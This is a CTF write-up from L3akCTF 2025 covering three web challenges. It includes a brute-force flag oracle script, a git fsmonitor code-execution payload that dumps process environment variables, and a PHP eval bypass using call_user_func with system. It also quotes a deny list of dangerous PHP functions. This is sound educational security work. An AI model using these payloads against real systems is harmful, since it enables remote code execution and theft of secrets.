---
title: "Certay - L3akCTF 2025"
category: "web"
subcategory: "lfi"
type: "writeup"
tags: ["web", "path-traversal", "file-upload", "werkzeug", "symlink", "certay", "lfi", "l3akctf", "l3akctf-2025", "2025", "ctf-writeup"]
summary: "Last weekend, I participated in the L3AK-CTF as part of team ENOFLAG."
source:
  name: "CTFtime writeup #40340"
  url: "https://ctftime.org/writeup/40340"
original_source: "https://blog.gehaxelt.in/p/l3ak-ctf-2025-writeups-2025-07-13/#certay--certay-revenge"
ctf:
  name: "L3akCTF 2025"
  year: 2025
  challenge: "Certay"
---

## Metadata

- **CTF:** L3akCTF 2025
- **Task:** Certay
- **Author team:** ENOFLAG
- **CTFtime:** <https://ctftime.org/writeup/40340>
- **Original writeup:** <https://blog.gehaxelt.in/p/l3ak-ctf-2025-writeups-2025-07-13/#certay--certay-revenge>

---
Last weekend, I participated in the [L3AK-CTF](https://ctf.l3ak.team/) as part of team ENOFLAG. We were just a few people meeting up at the university, but we had quite some fun with the CTF. This post contains the writeups for some of the challenges I solved.

I managed to solve several challenges, but I’ll only write about the more interesting ones:

  * Flag L3ak
  * GitBad
  * Certay & Certay revenge


# Flag L3ak 

The description states the following and we’re given [a zip file with the source code](https://blog.gehaxelt.in/uploads/files/ctf/2025-leakctf/flag_l3ak.zip):

```
    1
    2
    3
    4
```

| 

```
    What's the name of this CTF? Yk what to do 😉
    
    Author: p._.k
    http://34.134.162.213:17000 
```  
  
---|---  
  
Looking at the source code we find a pretty simple web application that basically only consists of two endpoints and a list of posts:

  * List of posts containing the flag:


```
     1
     2
     3
     4
     5
     6
     7
     8
     9
    10
    11
```

| 

```
    const posts = [
    	// ...
        {
            id: 3,
            title: "Not the flag?",
            content: `Well luckily the content of the flag is hidden so here it is: ${FLAG}`,
            author: "admin",
            date: "2025-05-13"
        },
    	// ...
    ]
```  
  
---|---  
  
  * `/api/search`


```
     1
     2
     3
     4
     5
     6
     7
     8
     9
    10
    11
    12
    13
    14
```

| 

```
    app.get('/api/posts', (_, res) => {
        const publicPosts = posts.map(post => ({
            id: post.id,
            title: post.title,
            content: post.content.replace(FLAG, '*'.repeat(FLAG.length)),
            author: post.author,
            date: post.date
        }));
        
        res.json({
            posts: publicPosts,
            total: publicPosts.length
        });
    });
```  
  
---|---  
  
  * `/api/posts`


```
     1
     2
     3
     4
     5
     6
     7
     8
     9
    10
    11
    12
    13
    14
    15
    16
    17
    18
    19
    20
    21
    22
    23
```

| 

```
    app.post('/api/search', (req, res) => {
        const { query } = req.body;
        if (!query || typeof query !== 'string' || query.length !== 3) {
            return res.status(400).json({ 
                error: 'Query must be 3 characters.',
            });
        }
    	const matchingPosts = posts
    	    .filter(post => 
    	        post.title.includes(query) ||
    	        post.content.includes(query) ||
    	        post.author.includes(query)
    	    )
    	    .map(post => ({
    	        ...post,
    	        content: post.content.replace(FLAG, '*'.repeat(FLAG.length))
    	}));    
    	res.json({
            results: matchingPosts,
            count: matchingPosts.length,
            query: query
        });
    });
```  
  
---|---  
  
The flag is masked with asterisks in the `/api/posts` endpoint, we cannot directly retrieve it, but we know that it is in the list of posts. So we have to focus on the the `/api/search` endpoint. We can provide our own search keyword, but it must have a length of 3 characters. Even if we find 3 characters that match the flag, the flag is again masked from the post content with asterisks (`post.content.replace(FLAG, '*'.repeat(FLAG.length))`).

However, we can turn this into an oracle to retrieve the flag character by character, since we know that the flag must begin with `L3AK{` and end with `}` (the CTF’s flag format). Here’s an example:

  * The results contain the post with `ID=3` (flag post), if the search is `L3A`, because it matches the beginning of the flag.
  * The results do _not_ contain this post if our search (i.e. `L3B`) are not part of the flag.


Now the remaining task is to guess iterate over all printable characters to guess the next correct one to the right. Obviously, we implement a script for that:

```
     1
     2
     3
     4
     5
     6
     7
     8
     9
    10
    11
    12
    13
    14
    15
    16
    17
    18
    19
    20
    21
    22
    23
    24
    25
    26
    27
    28
    29
    30
    31
    32
    33
    34
    35
    36
    37
    38
    39
    40
    41
    42
    43
    44
    45
    46
    47
    48
    49
    50
    51
    52
    53
    54
    55
```

| 

```
    import requests
    import string
    import itertools
    import json
    
    URL = 'http://34.134.162.213:17000/api/search'
    
    HEADERS = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://34.134.162.213:17000/',
        'Content-Type': 'application/json',
        'Origin': 'http://34.134.162.213:17000',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Priority': 'u=0',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache'
    }
    
    def check_query(query):
        data = {"query": query}
        try:
            resp = requests.post(URL, headers=HEADERS, json=data, timeout=5)
            if resp.status_code != 200:
                return False
            resp_json = resp.json()
            print(resp_json)
            print(len(resp_json.get('results', [])))
            for post in resp_json.get('results', []):
                if post['id'] == 3:
                    return True
            return False
        except Exception as e:
            print(f"Error with query {query}: {e}")
            return False
    
    def main():
    	FLAG = "L3AK{"
        while len(FLAG) != len("************************"):
            cflag = FLAG
            for c in string.printable:
                query = (cflag+ c)[-3:] 
                print(query)
                result = check_query(query)
                if result:
                    print(f"[+] HIT for '{query}': {result}")
                    FLAG = FLAG + c
                    print(cflag, FLAG)
                    break
    
    if __name__ == "__main__":
        main()
```  
  
---|---  
  
After waiting for the script to finish, we had the flag: `L3AK{L3ak1ng_th3_Fl4g??}`

# GitBad 

This was one of the most fun challenges that I solved, especially since I solved it in an (presumably unintended) way using RCE. The source code can be downloaded [here](https://blog.gehaxelt.in/uploads/files/ctf/2025-leakctf/gitbad_handout.zip). The web service offered one functionality: Upload a ZIP file with a git repository on which later `git submodule update --init --recursive` was executed.

The file upload in `main.py` was implemented in this way:

```
     1
     2
     3
     4
     5
     6
     7
     8
     9
    10
    11
    12
    13
    14
    15
    16
    17
    18
    19
    20
    21
    22
    23
    24
    25
    26
    27
    28
    29
    30
    31
    32
    33
    34
    35
    36
    37
    38
    39
    40
    41
    42
    43
    44
    45
```

| 

```
    @main_bp.route('/api/upload', methods=['POST'])
    @login_required
    def api_upload_file():
        if 'file' not in request.files:
            return jsonify({"success": False, "error": "No file part"}), 400
        file = request.files['file']
        if file.filename == '':
            return jsonify({"success": False, "error": "No selected file"}), 400
        
        # Check file size (1MB = 1024 * 1024 bytes)
        file.seek(0, os.SEEK_END)
        file_size = file.tell()
        file.seek(0)  
        
        if file_size > 1024 * 1024:  # 1MB limit
            return jsonify({"success": False, "error": "File size exceeds 1MB limit"}), 400
        
        if file and allowed_file(file.filename):
            user_upload_dir = os.path.join(current_app.config['UPLOAD_FOLDER'], session['user_id'])
            os.makedirs(user_upload_dir, exist_ok=True)
            
            # Create temporary file path
            file_path = os.path.join(user_upload_dir, secure_filename(file.filename))
            
            try:
                # Save the uploaded file
                file.save(file_path)
                
                # Process the ZIP file
                result = process_git_repo(file_path, user_upload_dir)
                
                # Clean up the ZIP file
                os.remove(file_path)
                
                if result['success']:
                    return jsonify({"success": True, "message": result['message']})
                else:
                    return jsonify({"success": False, "error": result['error']})
                    
            except Exception as e:
                if os.path.exists(file_path):
                    os.remove(file_path)
                return jsonify({"success": False, "error": f"Upload failed: {str(e)}"}), 500
        else:
            return jsonify({"success": False, "error": "Invalid file type. Only ZIP files are allowed."}), 400
```  
  
---|---  
  
The `secure_filename` function was imported from `werkzeug` and `allowed_file` looked good, too. So let’s go into the more interesting function that is `process_git_repo`, which is where I identified the vulnerability.

```
     1
     2
     3
     4
     5
     6
     7
     8
     9
    10
    11
    12
    13
    14
    15
    16
    17
    18
    19
    20
    21
    22
    23
    24
    25
    26
    27
    28
    29
    30
    31
    32
    33
    34
    35
    36
    37
    38
    39
    40
    41
    42
    43
    44
    45
    46
    47
    48
    49
    50
    51
    52
    53
    54
    55
    56
    57
    58
    59
    60
    61
    62
    63
    64
    65
    66
    67
    68
    69
    70
    71
    72
    73
    74
    75
    76
    77
    78
    79
    80
    81
    82
```

| 

```
    def process_git_repo(zip_path, extract_base_dir):
        """
        Extracts ZIP file and runs git submodule update --init --recursive
        Expects .git directory to be in the main directory after extraction
        """
        extract_dir = None
        
        try:
            # Create unique extraction directory
            zip_name = os.path.splitext(os.path.basename(zip_path))[0]
            extract_dir = os.path.join(extract_base_dir, f"extracted_{zip_name}")
            
            # Extract ZIP file with security checks
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                # Security check: prevent zip bomb and path traversal
                for member in zip_ref.namelist():
                    if member.startswith('/') or '..' in member:
                        return {"success": False, "error": "Malicious ZIP file detected - path traversal attempt"}
                    
                    # Check for zip bomb (too many files or deeply nested)
                    if len(zip_ref.namelist()) > 150:  # Max 150 files
                        return {"success": False, "error": "ZIP file contains too many files"}
                    
                    if member.count('/') > 6:  # Max 6 levels deep
                        return {"success": False, "error": "ZIP file has excessive directory nesting"}
                
                for member in zip_ref.infolist():
                    extraction_path = os.path.join(extract_dir, member.filename)
                    
                    normalized_path = os.path.normpath(extraction_path)
                    
                    if not normalized_path.startswith(os.path.normpath(extract_dir + os.sep)):
                        return {"success": False, "error": "Malicious ZIP file detected - symlink or path escape attempt"}
                    
                    zip_ref.extract(member, extract_dir)
                    
                    if os.path.islink(extraction_path):
                        os.unlink(extraction_path)
                        return {"success": False, "error": "Malicious ZIP file detected - symlink creation attempt"}
            
            # Check if .git directory exists in the extracted directory 
            git_dir = None
    
            # First check if .git is directly in extract_dir
            if os.path.exists(os.path.join(extract_dir, '.git')):
                git_dir = extract_dir
            else:
                # Search in subdirectories up to 2 levels deep
                for root, dirs, files in os.walk(extract_dir):
                    depth = root[len(extract_dir):].count(os.sep)
                    if depth <= 2 and '.git' in dirs:
                        git_dir = root
                        break
    
            if not git_dir:
                shutil.rmtree(extract_dir)
                return {"success": False, "error": "No Git repository found. ZIP must contain .git directory in root or main folder."}
    
            # Check if .git/config contains fsmonitor
            git_config_path = os.path.join(git_dir, '.git', 'config')
            if os.path.exists(git_config_path):
                with open(git_config_path, 'r') as config_file:
                    config_content = config_file.read()
                    if 'fsmonitor' in config_content.lower():
                        shutil.rmtree(extract_dir)
                        return {"success": False, "error": "Malicious Git repository detected - fsmonitor found in .git/config"}
    
            # Run git submodule update --init --recursive
            result = run_git_submodule_update(git_dir)
    
            # Clean up extracted files after processing
            shutil.rmtree(extract_dir)
    
            return result
            
        except zipfile.BadZipFile:
            return {"success": False, "error": "Invalid or corrupted ZIP file"}
        except Exception as e:
            # Clean up on error
            if extract_dir and os.path.exists(extract_dir):
                shutil.rmtree(extract_dir)
            return {"success": False, "error": f"Processing failed: {str(e)}"}
```  
  
---|---  
  
As we can see, the uploaded ZIP file is checked for some common ZIP pitfalls, which looked fine to me at first sight.

  * Symlinks in ZIP files
  * ZIP bombs
  * Path traversal


What caught my attention was the part about the `fsmonitor` check in the `.git/config` and a few lines later the `submodule update --init --recursive` call. As [Justin Steven writes on Github](https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md), this configuration option can be misused for RCE. I knew this trick from an earlier CTF, so I assumed we had to somehow bypass this check.

But let’s first have a quick look at the `run_git_submodule_update` function, which just does what the function name implies….

```
     1
     2
     3
     4
     5
     6
     7
     8
     9
    10
    11
    12
    13
    14
    15
    16
    17
    18
    19
    20
    21
    22
    23
    24
    25
    26
    27
    28
    29
    30
    31
```

| 

```
    def run_git_submodule_update(git_dir):
        """
        Runs git submodule update --init --recursive in the specified directory
        """
        try:
            result = subprocess.run(
                ['git', 'submodule', 'update', '--init', '--recursive'],
                cwd=git_dir,
                capture_output=True,
                text=True,
                timeout=10  
            )
            
            if result.returncode == 0:
                # Success
                output_msg = "Git submodules updated successfully!"
                if result.stdout.strip():
                    output_msg += f"\nOutput: {result.stdout.strip()}"
                return {"success": True, "message": output_msg}
            else:
                error_msg = "Git submodule update failed"
                if result.stderr.strip():
                    error_msg += f": {result.stderr.strip()}"
                return {"success": False, "error": error_msg}
                
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Git command timed out (>10 seconds)"}
        except FileNotFoundError:
            return {"success": False, "error": "Git is not installed on the server"}
        except Exception as e:
            return {"success": False, "error": f"Git command execution failed: {str(e)}"}
```  
  
---|---  
  
So how can we get the flag? I started to read the man pages of `git submodule` and played around with some test repositories locally. I discovered that after setting `git config protocol.file.allow always`, one could use local submodules using the `file:///` protocol.

This sparked the idea of uploading a ZIP file with two or more repositories, of which one is a submodule of the other because the assumption is that we somehow have to use the `git submodule update --init --recursive` invocation.

So let’s first one repository and one subrepository:

```
     1
     2
     3
     4
     5
     6
     7
     8
     9
    10
    11
    12
```

| 

```
    $> mkdir /tmp/exploit && cd /tmp/exploit
    # /tmp/exploit/
    $> git init . 
    $> touch foobar
    $> git add foobar && git commit -m 'initial commit'
    $> git config protocol.file.allow always
    
    $> mkdir subrepo && cd subrepo
    # /tmp/exploit/subrepo/
    $> git init .
    $> touch barfoo 
    $> git add barfoo && git commit -m 'initial commit'
```  
  
---|---  
  
Now we can add it as a submodule:

```
     1
     2
     3
     4
     5
     6
     7
     8
     9
    10
    11
    12
```

| 

```
    $> cd ../
    # /tmp/exploit/
    $> git submodule add ./sub subrepo
    Adding existing repo at 'subrepo' to the index
    $> ls
    total 4.0K
    drwxr-xr-x  4 sneef sneef 120 Jul 16 00:03 .
    drwxrwxrwt 21 root  root  600 Jul 16 00:00 ..
    -rw-r--r--  1 sneef sneef   0 Jul 16 00:01 foobar
    drwxr-xr-x  7 sneef sneef 240 Jul 16 00:03 .git
    -rw-r--r--  1 sneef sneef  51 Jul 16 00:03 .gitmodules
    drwxr-xr-x  3 sneef sneef  80 Jul 16 00:02 subrepo
```  
  
---|---  
  
Interestingly, the subrepo has its own `.git/config` file:

```
    1
    2
```

| 

```
    $> ls -lha subrepo/.git/config 
    -rw-r--r-- 1 sneef sneef 141 Jul 16 00:09 subrepo/.git/config
```  
  
---|---  
  
But the web application only checks the very first (top-level) `.git/config`!

```
     1
     2
     3
     4
     5
     6
     7
     8
     9
    10
    11
    12
```

| 

```
    # First check if .git is directly in extract_dir
    if os.path.exists(os.path.join(extract_dir, '.git')):
        git_dir = extract_dir
    # [...]
    # Check if .git/config contains fsmonitor
    git_config_path = os.path.join(git_dir, '.git', 'config')
    if os.path.exists(git_config_path):
        with open(git_config_path, 'r') as config_file:
            config_content = config_file.read()
            if 'fsmonitor' in config_content.lower():
                shutil.rmtree(extract_dir)
                return {"success": False, "error": "Malicious Git repository detected - fsmonitor found in .git/config"}
```  
  
---|---  
  
However, we can still add the `fsmonitor` RCE exploit to our `subrepo/.git/config` and it will get executed by `git submodule update --init --recursive`:

```
    1
    2
    3
    4
    5
    6
    7
    8
    9
```

| 

```
    $> cat subrepo/.git/config 
    [core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
        fsmonitor = "echo \"Pwned as $(id)\">&2; false"
    $> git submodule update --init --recursive
    Pwned as uid=1000 gid=1000 groups=1000
```  
  
---|---  
  
So now we have RCE in theory. From the `Dockerfile` we know that the flag is in the environment of the container:

```
    1
    2
    3
```

| 

```
    # Set environment variables
    ENV MONGODB_URI=mongodb://localhost:27017/gitbad \
        Flag=L3AK{testing}
```  
  
---|---  
  
Luckily, the web app is running as `root` inside the container, so we can easily read any processes’ environment through the `/proc/` filesystem and copy it to a path were we can easily obtain it:

```
    1
```

| 

```
    fsmonitor = "cat /proc/1/environ>&2 >/app/static/eno.flag.txt; false"
```  
  
---|---  
  
Again, lucky for us that the web app serves static files:

```
    1
    2
    3
```

| 

```
    @main_bp.route("/static/<path:filename>")
    def serve_static(filename):
        return send_from_directory("static", filename)
```  
  
---|---  
  
So the only thing that we have to do is to zip our exploit folder and upload the ZIP file:

```
    1
    2
    3
```

| 

```
    $> pwd
    /tmp/testexploit
    $> $ zip -r9 ../testexploit.zip ./
```  
  
---|---  
  
The upload of the ZIP is successful:

![GitBad Successful Upload](https://blog.gehaxelt.in/uploads/files/ctf/2025-leakctf/gitbad_succesfull.png)

Finally, we browse to the `eno.flag.txt` file to obtain the flag: `L3AK{5k1ll_15sU3_5p0773d_Y0U_N33D_B3773R_D3V_T34M!!!}` (Screenshot was taken later during the writeup.)

![GitBad Flag](https://blog.gehaxelt.in/uploads/files/ctf/2025-leakctf/gitbad_testflag.png)

# Certay & Certay revenge 

Two other web challenges I solved late in the evening were Certay and Certay revenge, whose files you can download [here](https://blog.gehaxelt.in/uploads/files/ctf/2025-leakctf/Certay_dist.zip) and [here](https://blog.gehaxelt.in/uploads/files/ctf/2025-leakctf/Certay_Rev_dist.zip).

Looking through the PHP code, we find the interesting part to be in `dashboard.php`:

```
     1
     2
     3
     4
     5
     6
     7
     8
     9
    10
    11
    12
    13
    14
    15
    16
    17
    18
    19
    20
    21
    22
    23
    24
    25
    26
    27
    28
    29
    30
    31
    32
    33
    34
    35
    36
    37
    38
    39
    40
    41
    42
    43
    44
    45
```

| 

```
    // From config.php: 
    define('KEY', '0123456789abcdef0123456789abcdef'); // generated randomly by the Dockerfile
    $dangerous = [
        'exec', 'shell_exec', 'system', 'passthru', 'proc_open', 'popen', '$', '`',
        'curl_exec', 'curl_multi_exec', 'eval', 'assert', 'create_function',
        'include', 'include_once', 'require', 'require_once', "file_get_contents",
        'readfile', 'fopen', 'fwrite', 'fclose', 'unlink', 'rmdir',
        'copy', 'rename', 'chmod', 'chown', 'chgrp', 'touch', 'mkdir',
        'rmdir', 'fseek', 'fread', 'fgets', 'fgetcsv',
        'file_put_contents', 'stream_get_contents', 'stream_copy_to_stream',
        'stream_get_line', 'stream_set_blocking', 'stream_set_timeout',
        'stream_select', 'stream_socket_client', 'stream_socket_server',
        'stream_socket_accept', 'stream_socket_recvfrom', 'stream_socket_sendto',
        'stream_socket_get_name', 'stream_socket_pair', 'stream_context_create',
        'stream_context_set_option', 'stream_context_get_options'
    ];
    // [...]
    function safe_sign($data) {
        return openssl_encrypt($data, 'aes-256-cbc', KEY, 0, iv);
    }
    function custom_sign($data, $key, $vi) {
        return openssl_encrypt($data, 'aes-256-cbc', $key, 0, $vi);
    }
    // [...]
    if (isset($_GET['msg']) && isset($_GET['hash']) && isset($_GET['key'])) {
        if (custom_sign($_GET['msg'], $yek, safe_sign($_GET['key'])) === $_GET['hash']) {
    // [...]
        foreach ($notes as $note) {
            $content = $note['content'];
            if (strpos($content, '`') !== false) {
                echo 'You are a betrayer!';
                continue;
            }
            if (has_concat_bypass($content, $dangerous)) {
                echo 'You are a betrayer!';
                continue;
            }
            try {
                eval($content);
            } catch (Throwable $e) {
                echo "<pre class='error'>Eval error: "
                   . htmlspecialchars($e->getMessage())
                   . "</pre>";
            }
        }
```  
  
---|---  
  
There were a few issues that directly grabbed my attention:

  * `iv` is neither a variable (the `$` is missing) nor a constant (never defined).
  * `$yek` is never assigned a value, so the `$key` in `custom_sign` is `NULL`.
  * `safe_sign($_GET['key'])` is the `$vi` in `custom_sign`.
  * `$content` is user-supplied and later `eval`‘ed.
  * The flag is in `/tmp/flag.txt`


Since `KEY` was properly randomized in the `Dockerfile`, the intuition was that we somehow need to bypass this cryptographic check, before we could continue to the `eval()` to somehow obtain the flag.

In order to better understand how to bypass the first check, I’ve added some debug statements to the two functions:

```
     1
     2
     3
     4
     5
     6
     7
     8
     9
    10
    11
    12
    13
    14
    15
    16
    17
    18
    19
    20
    21
    22
    23
    24
    25
    26
    27
    28
    29
    30
    31
    32
    33
    34
    35
    36
    37
    38
    39
    40
    41
    42
    43
```

| 

```
    function safe_sign($data) {
        echo("<hr>");
        // KEY = define(...)? -> unknown
        // iv = "iv\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
        echo("safe_sign-KEY: "); var_dump(KEY); echo("<br>");
        echo('safe_sign-$data: '); var_dump($data); echo("<br>");
        echo("safe_sign-iv: "); var_dump(iv); echo("<br>");
        $ret = openssl_encrypt($data, 'aes-256-cbc', KEY, 0, iv);
        echo('safe_sign-$ret: '); var_dump($ret); echo("<br>");
        echo("<hr>");
        return $ret;
    }
    
    function custom_sign($data, $key, $vi) {
        echo("<hr>");
        // $key = NULL
        // $vi = safe_sign(...);
        echo('custom_sign-$data: '); var_dump($data); echo("<br>");
        echo('custom_sign-$key: '); var_dump($key); echo("<br>");
        echo('custom_sign-$vi: '); var_dump($vi); echo("<br>");
        $ret= openssl_encrypt($data, 'aes-256-cbc', $key, 0, $vi);
        echo('custom_sign-$ret: '); var_dump($ret); echo("<br>");
        echo("<hr>");
        return $ret;
    }
    // [...]
    $msg = $_GET['msg'];
    $hash = $_GET['hash'];
    $key = $_GET['key'];
    
    if (isset($msg) && isset($hash) && isset($key)) {
        $safe_sign = safe_sign($key);
        echo("msg: "); var_dump($msg); echo("<br>");
        echo("hash: "); var_dump($hash); echo("<br>");
        echo("key: "); var_dump($key); echo("<br>");
        echo("safe_sign: "); var_dump($safe_sign); echo("<br>");
        echo('$yek: '); var_dump($yek); echo("<br>");
        $custom_sign = custom_sign($msg, $yek, $safe_sign);
        echo('custom_sign: '); var_dump($custom_sign); echo("<br>");
        $check = $custom_sign === $hash;
        echo("Check: "); var_dump($check); echo("<br>");
        if ($check) {
            // [...]
```  
  
---|---  
  
That helped a lot to better understand what happens. Actually, PHP issued warnings that `iv` is an undefined constant and will be assumed to be `"iv"`, so that the `openssl_encrypt` function in `safe_sign` decides to pad the remaining 14 bytes with zeroes.

After playing around with the `$_GET` parameters, I noticed that passing an array leads to interesting warnings and return values from these functions. For example, if `$_GET['key']` is an array, the `safe_sign` function will return `NULL`. Since it is itself passed to `custom_sign` as the `$key` parameter, the `custom_sign` function is called as follows: `custom_sign($msg, NULLL, NULL)` \- effectively doing AES with a NULL key and IV.

Thus, the previously unknown and randomized `KEY` is not relevant for computing the result of `custom_sign` \- only `$msg` is, which we do have under control. That means, we bypassed the cryptographic check! As an example, for `?msg=asd&key[]=`, the return value of `custom_sign` is `Q4OOvv34fjwnsiOMHfHLLQ==`

Here’s the debug output for the URL: `dashboard.php?msg=asd&key[]=&hash=Q4OOvv34fjwnsiOMHfHLLQ==`:

```
     1
     2
     3
     4
     5
     6
     7
     8
     9
    10
    11
    12
    13
    14
    15
    16
    17
    18
    19
    20
    21
    22
    23
```

| 

```
    safe_sign-KEY: string(32) "0123456789abcdef0123456789abcdef"
    safe_sign-$data: array(1) { [0]=> string(0) "" }
    safe_sign-iv:
    Warning: Use of undefined constant iv - assumed 'iv' (this will throw an Error in a future version of PHP) in /var/www/html/dashboard.php on line 24
    string(2) "iv"
    
    Warning: Use of undefined constant iv - assumed 'iv' (this will throw an Error in a future version of PHP) in /var/www/html/dashboard.php on line 25
    
    Warning: openssl_encrypt() expects parameter 1 to be string, array given in /var/www/html/dashboard.php on line 25
    safe_sign-$ret: NULL
    msg: string(3) "asd"
    hash: string(24) "Q4OOvv34fjwnsiOMHfHLLQ=="
    key: array(1) { [0]=> string(0) "" }
    safe_sign: NULL
    $yek: NULL
    custom_sign-$data: string(3) "asd"
    custom_sign-$key: NULL
    custom_sign-$vi: NULL
    
    Warning: openssl_encrypt(): Using an empty Initialization Vector (iv) is potentially insecure and not recommended in /var/www/html/dashboard.php on line 38
    custom_sign-$ret: string(24) "Q4OOvv34fjwnsiOMHfHLLQ=="
    custom_sign: string(24) "Q4OOvv34fjwnsiOMHfHLLQ=="
    Check: bool(true)
```  
  
---|---  
  
`Check: bool(true)` is the important part as it shows that we have successfully bypassed the first check. Now we only need to find a way to obtain the flag. Going through the list of `$dangerous` functions, we notice that `call_user_func` is missing from the list. Thus, we can craft the following RCE payload: `echo "foo"; call_user_func('system','cat /tmp/flag.txt');`, which will get us the flag: `L3AK{N0t_4_5ecret_4nYm0r3333!!5215kgfr5s85z9}`

I’m not sure if this was the intended solve, but this challenge felt rather easy after the initial crypto-scare :)

The 2nd version of this challenge had one additional function and security-check for the content in `dashboard.php`:

```
     1
     2
     3
     4
     5
     6
     7
     8
     9
    10
    11
    12
    13
    14
    15
```

---

*Truncated at 1200 lines. Full text: <https://blog.gehaxelt.in/p/l3ak-ctf-2025-writeups-2025-07-13/#certay--certay-revenge>*
